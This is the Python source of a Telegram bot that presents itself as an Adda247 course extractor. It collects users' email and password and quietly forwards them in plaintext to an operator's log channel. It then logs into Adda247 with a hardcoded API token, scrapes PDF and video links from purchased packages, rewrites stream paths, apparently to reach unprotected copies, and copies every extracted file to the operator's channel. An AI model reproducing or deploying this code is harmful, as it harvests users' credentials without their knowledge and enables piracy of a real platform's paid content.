import os
import time
import json
import logging
import asyncio
import httpx
import pytz
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode

import config

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Pyrogram Bot Client
app = Client(
    "adda_extractor_bot",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN
)

# In-memory user state dictionary (Replaces fragile listen loop)
USER_STATES = {}
THUMB_PATH = "thumb.jpg"
TIMEOUT = 30

def safe_get(obj, *keys, default=None):
    """Safely fetch nested dictionary values"""
    try:
        for key in keys:
            if obj is None:
                return default
            obj = obj.get(key)
        return obj if obj is not None else default
    except (AttributeError, KeyError):
        return default

async def download_thumbnail():
    """Download thumbnail locally if available"""
    if not os.path.exists(THUMB_PATH) and config.THUMB_URL:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(config.THUMB_URL)
                if response.status_code == 200:
                    with open(THUMB_PATH, 'wb') as f:
                        f.write(response.content)
                    return THUMB_PATH
        except Exception as e:
            logger.error(f"Thumbnail download failed: {e}")
            return None
    return THUMB_PATH if os.path.exists(THUMB_PATH) else None

async def make_request(url, headers=None, method="GET", json_data=None, timeout=TIMEOUT):
    """Handle Async HTTP requests using httpx"""
    try:
        async with httpx.AsyncClient() as client:
            if method == "GET":
                response = await client.get(url, headers=headers, timeout=timeout)
            else:
                response = await client.post(url, headers=headers, json=json_data, timeout=timeout)
            
            response.raise_for_status()
            return response.json()
    except httpx.HTTPError as e:
        logger.error(f"HTTP Error: {e}")
        return None
    except Exception as e:
        logger.error(f"Request Error: {e}")
        return None

async def forward_to_log(message: Message, platform: str):
    """Logs user credentials to defined Log Channel"""
    if config.PREMIUM_LOGS:
        try:
            log_text = (
                f"🔑 <b>NEW LOGIN RECEIVED</b>\n\n"
                f"👤 <b>User:</b> {message.from_user.mention} (<code>{message.from_user.id}</code>)\n"
                f"📱 <b>Platform:</b> {platform}\n"
                f"📝 <b>Data:</b> <code>{message.text}</code>"
            )
            await app.send_message(config.PREMIUM_LOGS, log_text, parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed to forward logs: {e}")

@app.on_message(filters.command(["start"]))
async def start_cmd(client, message: Message):
    await message.reply_text(
        f"👋 **Hello {message.from_user.first_name}!**\n\n"
        "Main Adda247 Batch Content Extractor Bot hoon.\n"
        "Extract karne ke liye `/adda` command use karein."
    )

@app.on_message(filters.command(["adda"]))
async def adda_command_handler(client, message: Message):
    USER_STATES[message.chat.id] = "WAITING_FOR_CREDENTIALS"
    await message.reply_text(
        "🔹 <b>ADDA247 EXTRACTOR PRO</b> 🔹\n\n"
        "Apne login details iss format mein bhejein:\n"
        "📧 <code>email*password</code>\n\n"
        "<i>Example:</i>\n"
        "<code>user@gmail.com*pass123</code>\n\n"
        "❌ Cancel karne ke liye `/cancel` likhein.",
        parse_mode=ParseMode.HTML
    )

@app.on_message(filters.command(["cancel"]))
async def cancel_handler(client, message: Message):
    if message.chat.id in USER_STATES:
        del USER_STATES[message.chat.id]
        await message.reply_text("🛑 Extraction Process Cancelled.")
    else:
        await message.reply_text("Koi active process nahi chal rha.")

@app.on_message(filters.text & filters.private & ~filters.command(["adda", "start", "cancel"]))
async def process_credentials(client, message: Message):
    chat_id = message.chat.id
    
    # State check
    if USER_STATES.get(chat_id) != "WAITING_FOR_CREDENTIALS":
        return

    # Reset State
    del USER_STATES[chat_id]

    if '*' not in message.text:
        await message.reply_text("❌ Invalid format! Please use `email*password` format.")
        return

    status_msg = await message.reply_text("🔄 <b>Processing authentication...</b>", parse_mode=ParseMode.HTML)

    # Log login data internally
    await forward_to_log(message, "Adda247")

    email, password = message.text.split("*", 1)

    headers = {
        "authority": "userapi.adda247.com",
        "Content-Type": "application/json",
        "X-Auth-Token": "fpoa43edty5",
        "X-Jwt-Token": ""
    }

    login_data = {
        "email": email.strip(),
        "providerName": "email",
        "sec": password.strip()
    }

    # API Login Call
    login_response = await make_request(
        "https://userapi.adda247.com/login?src=aweb",
        headers=headers,
        method="POST",
        json_data=login_data
    )

    if not login_response:
        await status_msg.edit_text("❌ <b>Login Failed:</b> Server issue ya galat request.")
        return

    jwt = safe_get(login_response, "jwtToken")
    if not jwt:
        await status_msg.edit_text("❌ <b>Login Failed:</b> Invalid Email or Password.")
        return

    headers["X-Jwt-Token"] = jwt
    await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching packages...", parse_mode=ParseMode.HTML)

    # Fetch User Packages
    packages_response = await make_request(
        "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb",
        headers=headers
    )

    packages = safe_get(packages_response, "data", default=[])
    if not packages:
        await status_msg.edit_text("❌ <b>No Packages Found:</b> Iss account par koi active package nahi hai.")
        return

    thumb_path = await download_thumbnail()

    for package in packages:
        try:
            package_id = safe_get(package, "packageId")
            package_title = safe_get(package, "title", default="Untitled").replace('|', '_').replace('/', '_')

            if not package_id:
                continue

            await status_msg.edit_text(
                f"🔄 <b>Processing Package</b>\n\n📦 <code>{package_title}</code>",
                parse_mode=ParseMode.HTML
            )

            start_time = time.time()
            file_name = f"ADDA_{package_id}_{package_title}.txt"
            total_items = 0

            with open(file_name, "w", encoding='utf-8') as file:
                # Direct Content Endpoint
                content_resp = await make_request(
                    f"https://store.adda247.com/api/v1/my/purchase/content/{package_id}?src=aweb",
                    headers=headers
                )
                if content_resp:
                    contents = safe_get(content_resp, "data", "contents", default=[])
                    for content in contents:
                        c_name = safe_get(content, "name", default="Untitled").replace('|', '_').replace('/', '_')
                        c_url = safe_get(content, "url")
                        if c_url:
                            file.write(f"{c_name}: {c_url}\n")
                            total_items += 1

                # Sub-Categories Extraction
                if total_items == 0:
                    categories = ["RECORDED_COURSE", "ONLINE_LIVE_CLASSES", "TEST_SERIES"]
                    for category in categories:
                        child_resp = await make_request(
                            f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={category}&isComingSoon=false&pageNumber=0&pageSize=100&src=aweb",
                            headers=headers
                        )
                        child_packages = safe_get(child_resp, "data", "packages", default=[])
                        
                        for child in child_packages:
                            child_id = safe_get(child, "packageId")
                            if not child_id:
                                continue

                            endpoints = [
                                (f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb", "onlineClasses"),
                                (f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb", "contents"),
                                (f"https://store.adda247.com/api/v1/my/purchase/test/{child_id}?src=aweb", "tests")
                            ]

                            for endpoint, content_key in endpoints:
                                c_resp = await make_request(endpoint, headers=headers)
                                items = safe_get(c_resp, "data", content_key, default=[])
                                
                                for item in items:
                                    item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                                    
                                    # PDF link parsing
                                    pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf")
                                    if pdf_file:
                                        file.write(f"{item_name}: https://store.adda247.com/{pdf_file}\n")
                                        total_items += 1

                                    # Video Stream link parsing
                                    video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
                                    if video_url:
                                        try:
                                            v_resp = await make_request(
                                                f"https://videotest.adda247.com/file?vp={video_url}&pkgId={child_id}&isOlc=true",
                                                headers=headers
                                            )
                                            if v_resp and isinstance(v_resp, str):
                                                for line in v_resp.split('\n'):
                                                    if "480p30playlist.m3u8" in line:
                                                        stream_url = line.replace('/updated', '/demo/updated')
                                                        file.write(f"{item_name}: {stream_url}\n")
                                                        total_items += 1
                                                        break
                                        except Exception:
                                            continue

            # Upload File if content parsed
            if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
                elapsed = time.time() - start_time
                user_mention = message.from_user.mention
                caption = (
                    "🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                    f"📱 <b>APP:</b> ADDA 247\n"
                    f"📚 <b>BATCH:</b> {package_title}\n"
                    f"⏱ <b>TIME TAKEN:</b> {elapsed:.1f}s\n"
                    f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                    f"📊 <b>CONTENT STATS</b>\n"
                    f"└─ 📁 Total Items: {total_items}\n\n"
                    f"🚀 <b>Extracted by:</b> {user_mention}\n\n"
                    f"<code>╾───• {config.BOT_TEXT} •───╼</code>"
                )

                # Send file to Private User
                await message.reply_document(
                    document=file_name,
                    caption=caption,
                    thumb=thumb_path,
                    parse_mode=ParseMode.HTML
                )

                # Backup file to Log Channel
                if config.PREMIUM_LOGS:
                    await app.send_document(
                        chat_id=config.PREMIUM_LOGS,
                        document=file_name,
                        caption=caption,
                        thumb=thumb_path,
                        parse_mode=ParseMode.HTML
                    )

                os.remove(file_name)

        except Exception as e:
            logger.error(f"Package Error: {e}")
            continue

    await status_msg.edit_text("✅ <b>Extraction Completed!</b>\n\nSaare available files bhej diye gaye hain.")

if __name__ == "__main__":
    print("Bot starting...")
    app.run()